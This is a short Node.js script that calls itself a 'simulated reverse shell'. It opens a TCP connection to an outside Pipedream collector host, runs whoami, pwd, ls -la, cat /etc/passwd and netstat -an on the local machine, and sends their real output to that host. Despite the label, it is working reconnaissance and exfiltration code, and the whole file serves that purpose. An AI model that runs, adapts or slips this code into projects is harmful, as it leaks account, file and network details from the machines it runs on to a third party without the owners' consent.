const net = require('net');
const { exec } = require('child_process');

const HOST = 'eop3b98jxkzuqt4.m.pipedream.net';
const PORT = 80;

console.log('Simulated reverse shell started');

const client = new net.Socket();
client.connect(PORT, HOST, () => {
    console.log(`Connected to ${HOST}:${PORT}`);

    client.write('Reverse shell connection established\n');

    // Simulate a few commands
    const commands = [
        'whoami',
        'pwd',
        'ls -la',
        'cat /etc/passwd',
        'netstat -an'
    ];

    let commandIndex = 0;

    const simulateCommand = () => {
        if (commandIndex < commands.length) {
            const command = commands[commandIndex];
            console.log(`Executing: ${command}`);
            client.write(`$ ${command}\n`);

            exec(command, (error, stdout, stderr) => {
                if (error) {
                    client.write(`Error: ${error.message}\n`);
                } else {
                    client.write(stdout);
                }
                commandIndex++;
                setTimeout(simulateCommand, 2000); // Wait 2 seconds before next command
            });
        } else {
            console.log('Simulation complete');
            client.destroy();
        }
    };

    simulateCommand();
});

client.on('error', (error) => {
    console.error('Failed to connect:', error.message);
});

client.on('close', () => {
    console.log('Connection closed');
});
